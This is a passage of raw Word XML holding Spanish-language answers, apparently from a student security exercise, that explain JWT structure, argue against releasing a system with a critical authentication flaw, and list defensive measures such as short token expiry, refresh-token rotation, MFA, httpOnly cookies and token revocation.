    <w:p w14:paraId="72B0C500" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Header: indica el algoritmo usado.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02828478" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Payload: contiene datos del usuario, como ID, rol o fecha de expiración.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64209F9F" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Signature: verifica que el token no fue alterado.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52988129" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3F9FF00A" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Aunque está codificado en Base64, el contenido no está cifrado, así que cualquiera puede leerlo. Por eso no se deben guardar datos sensibles dentro del token.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75C889EB" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="295FF7DB" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>4. Si un sistema en producción tiene esta vulnerabilidad, ¿debe liberarse igual?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61B44D38" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5D03542E" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>No. Una vulnerabilidad de autenticación como esta es crítica y no debería llegar a producción.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63C145B2" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="089BA777" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Permite que cualquier atacante obtenga acceso no autorizado, incluso con privilegios de administrador. Además, compromete la seguridad de todos los usuarios y puede generar problemas legales y económicos para la empresa.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="567445FD" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="45ADD8DF" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Lo correcto sería detener el despliegue hasta corregir el problema o deshabilitar inmediatamente el sistema vulnerable si ya está publicado.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3965B44F" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0DC3179D" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>5. ¿Qué responsabilidad tiene el desarrollador frente a este riesgo?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="106D9E81" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="586684BE" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>El desarrollador tiene una responsabilidad ética y profesional de proteger la información de los usuarios.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FFF4A9B" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2FDE177E" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Debe aplicar buenas prácticas de seguridad, reportar vulnerabilidades y evitar publicar sistemas inseguros. Ignorar un problema conocido puede considerarse negligencia y, dependiendo del país, incluso traer consecuencias legales.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="763807EC" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E94F00E" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>La seguridad no es opcional, es parte del trabajo del desarrollo de software.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12CA24BA" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6FEFACAA" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>6. ¿Qué otras mejoras de seguridad implementarías?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58BFDF55" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53E7972B" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Implementaría medidas como:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="769F3DE9" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5617060F" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Limitar intentos de login para evitar fuerza bruta.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C505560" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Usar refresh tokens y expiraciones cortas.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40E81B3E" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Agregar autenticación multifactor (MFA).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2369EB6C" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Obligar el uso de HTTPS.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3179562B" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Guardar claves y secretos en variables de entorno.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16EB717C" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Registrar accesos y eventos importantes en logs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="616D6EEC" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Usar Redis para manejar listas negras de tokens.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E453B83" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0108DA06" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Estas mejoras ayudan a reducir riesgos y fortalecer la autenticación.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BA0CBF4" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="72BD3D2F" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>7. ¿Cómo evitarías el uso de tokens robados?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60E12ECE" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39CD830E" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>La mejor estrategia es hacer que los tokens tengan poca utilidad si son robados.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C299158" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="01B9ADF8" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Por ejemplo:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B53C422" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6798194E" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Tokens con expiración corta.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="510FA4B8" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Refresh tokens con rotación.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="602F0973" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Guardarlos en cookies httpOnly para evitar robo mediante JavaScript.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="078A5C1E" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Detectar accesos sospechosos desde diferentes ubicaciones o dispositivos.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61FCAE7B" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Poder revocar tokens inmediatamente mediante una blacklist.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35BE9EBE" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6CDCB4BD" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Así, aunque un atacante robe un token, su tiempo de uso sería muy limitado.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A0EAF11" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="505F1B7B" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
